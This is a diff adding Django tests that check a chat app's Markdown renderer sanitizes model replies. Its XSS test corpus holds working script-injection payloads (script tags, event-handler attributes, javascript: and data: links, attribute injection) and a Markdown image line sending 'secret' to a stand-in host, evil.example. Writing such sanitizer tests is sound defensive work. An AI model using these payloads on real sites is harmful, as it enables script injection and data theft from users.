@@ -966,3 +966,165 @@ class GlobalSystemPromptTests(TestCase):
         response = self.client.post(reverse("chat_new"), {"llm_model": model.pk, "content": "Hi"})
         self.assertEqual(response.status_code, 402)
         post.assert_not_called()
+
+
+# --- Safe Markdown (loop 5) ---------------------------------------------------------
+
+XSS_CORPUS = {
+    "script tag": "<script>alert(1)</script>",
+    "img onerror": '<img src=x onerror="alert(1)">',
+    "iframe": '<iframe src="https://evil.example"></iframe>',
+    "svg onload": "<svg onload=alert(1)>",
+    "style tag": "<style>body{background:url(https://evil.example/x)}</style>",
+    "raw js link": '<a href="javascript:alert(1)">x</a>',
+    "md js link": "[click](javascript:alert(1))",
+    "md js link, entity-encoded": "[click](&#106;avascript:alert(1))",
+    "md data link": "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
+    "autolink js": "<javascript:alert(1)>",
+    "md image exfil": "![a](https://evil.example/leak?q=secret)",
+    "aligned table (style)": "| a | b |\n|:--|--:|\n| 1 | 2 |",
+    "code class injection": '```x" onmouseover="alert(1)\ncode\n```',
+    "inline html in text": 'Hello <b onclick="alert(1)">there</b>',
+}
+
+SAFE_TAGS = {
+    "p", "br", "strong", "em", "s", "del", "code", "pre", "blockquote", "ul", "ol", "li",
+    "h1", "h2", "h3", "h4", "h5", "h6", "hr", "a", "table", "thead", "tbody", "tr", "th", "td",
+}
+
+
+def unsafe_html(html, allowed_tags=SAFE_TAGS):
+    """Parse `html` and list anything that shouldn't reach the page from model output."""
+    from html.parser import HTMLParser
+
+    issues = []
+
+    class Audit(HTMLParser):
+        def handle_starttag(self, tag, attrs):
+            if tag not in allowed_tags:
+                issues.append(f"<{tag}>")
+            for name, value in attrs:
+                value = value or ""
+                if name.startswith("on") or name in ("style", "src", "srcset"):
+                    issues.append(f"{tag}[{name}]")
+                if name == "href" and not value.lower().startswith(("http://", "https://", "mailto:")):
+                    issues.append(f"{tag}[href={value[:30]}]")
+                if tag == "code" and name == "class" and not re.fullmatch(r"language-[A-Za-z0-9_+-]+", value):
+                    issues.append(f"code[class={value[:30]}]")
+
+    Audit().feed(html)
+    return issues
+
+
+def thread_html(html):
+    """Just the message thread (the page chrome has its own allowed elements)."""
+    return html.split('class="thread-inner"', 1)[1].split('class="composer', 1)[0]
+
+
+def rendered_model_output(html):
+    """The inner HTML of every rendered reply. Sanitized output never contains a <div>,
+    so the first </div> closes the fragment."""
+    fragments = re.findall(r'<div class="bubble-text md">(.*?)</div>', html, re.S)
+    assert fragments, "no rendered model reply found"
+    return "".join(fragments)
+
+
+class MarkdownRenderingTests(TestCase):
+    def render(self, text):
+        from chat.markdown import render_markdown
+
+        return str(render_markdown(text))
+
+    def test_xss_corpus_is_neutralized(self):
+        for name, payload in XSS_CORPUS.items():
+            with self.subTest(case=name):
+                self.assertEqual(unsafe_html(self.render(payload)), [])
+
+    def test_image_becomes_a_plain_link(self):
+        html = self.render(XSS_CORPUS["md image exfil"])
+        self.assertNotIn("<img", html)
+        self.assertIn('href="https://evil.example/leak?q=secret"', html)
+        self.assertIn('rel="noopener noreferrer nofollow"', html)
+
+    def test_markdown_features(self):
+        html = self.render(
+            "**bold** *em* ~~gone~~ `inline`\n\n- one\n- two\n\n1. first\n\n"
+            "> quoted\n\n[site](https://example.com)\n\n"
+            "```python\nprint('<b>')\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |"
+        )
+        for fragment in (
+            "<strong>bold</strong>", "<em>em</em>", "<s>gone</s>", "<code>inline</code>",
+            "<ul>", "<li>one</li>", "<ol>", "<blockquote>",
+            '<code class="language-python">print(\'&lt;b&gt;\')', "<pre>",
+            "<table>", "<thead>", "<tbody>", "<td>1</td>",
+            'href="https://example.com"', 'rel="noopener noreferrer nofollow"',
+        ):
+            self.assertIn(fragment, html)
+        self.assertEqual(unsafe_html(html), [])
+
+    def test_table_alignment_style_is_stripped(self):
+        html = self.render(XSS_CORPUS["aligned table (style)"])
+        self.assertIn("<table>", html)
+        self.assertNotIn("style", html)
+
+    def test_empty_and_none(self):
+        self.assertEqual(self.render(""), "")
+        self.assertEqual(self.render(None), "")
+
+
+@override_settings(OPENAI_API_KEY="test-key")
+@mock.patch("llm.http.requests.post")
+class MarkdownInChatTests(TestCase):
+    def setUp(self):
+        self.user = User.objects.create_user("alice", password=PASSWORD)
+        self.gpt = make_gpt()
+        self.client.force_login(self.user)
+
+    def test_corpus_through_page_and_json(self, post):
+        for name, payload in XSS_CORPUS.items():
+            with self.subTest(case=name):
+                Conversation.objects.all().delete()
+                # New chat via JSON -> main_html
+                post.return_value = proxy_ok(payload)
+                data = self.client.post(
+                    reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi"},
+                    HTTP_ACCEPT="application/json",
+                ).json()
+                self.assertEqual(unsafe_html(rendered_model_output(data["main_html"])), [], "main_html")
+                conversation = Conversation.objects.get()
+                # Existing chat via JSON -> messages_html
+                data = self.client.post(
+                    reverse("chat_detail", args=[conversation.pk]), {"content": "Again"},
+                    HTTP_ACCEPT="application/json",
+                ).json()
+                self.assertEqual(unsafe_html(rendered_model_output(data["messages_html"])), [], "messages_html")
+                # Full page (form mode rendering)
+                page = self.client.get(reverse("chat_detail", args=[conversation.pk])).content.decode()
+                self.assertEqual(unsafe_html(rendered_model_output(page)), [], "page")
+                # The whole thread, parsed: only Markdown tags plus our own div/span wrappers,
+                # and no event handler, style, src or unsafe link anywhere.
+                self.assertEqual(unsafe_html(thread_html(page), SAFE_TAGS | {"div", "span"}), [], "thread")
+
+    def test_reply_renders_markdown_but_is_stored_raw(self, post):
+        raw = "Here is **bold**:\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |"
+        post.return_value = proxy_ok(raw)
+        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi"})
+        conversation = Conversation.objects.get()
+        reply = conversation.messages.get(role="assistant")
+        self.assertEqual(reply.content, raw)  # stored raw
+
+        page = thread_html(self.client.get(reverse("chat_detail", args=[conversation.pk])).content.decode())
+        self.assertIn('<div class="bubble-text md"><p>Here is <strong>bold</strong>:</p>', page)
+        self.assertIn("<table>", page)
+
+        post.return_value = proxy_ok("ok")
+        self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Next"})
+        resent = post.call_args.kwargs["json"]["messages"]
+        self.assertEqual(resent[1], {"role": "assistant", "content": raw})  # resent raw
+
+    def test_user_messages_are_not_rendered(self, post):
+        post.return_value = proxy_ok("fine")
+        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "**not bold** <i>x</i>"})
+        page = thread_html(self.client.get(reverse("chat_detail", args=[Conversation.objects.get().pk])).content.decode())
+        self.assertIn("**not bold** &lt;i&gt;x&lt;/i&gt;", page)
+        self.assertNotIn("<strong>not bold</strong>", page)
